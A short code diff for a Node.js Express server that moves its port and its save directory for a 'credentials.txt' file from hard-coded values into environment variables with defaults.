@@ -3,10 +3,10 @@ const fs = require('fs');
 const path = require('path');
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
-// The exact folder where you want the .txt file
-const SAVE_DIR = 'C:\\Users\\donut\\Desktop\\Hi';
+// Use environment variable for save directory, fallback to temp directory
+const SAVE_DIR = process.env.SAVE_DIR || path.join(__dirname, 'data');
 const SAVE_FILE = path.join(SAVE_DIR, 'credentials.txt');
 
 // Ensure the directory exists
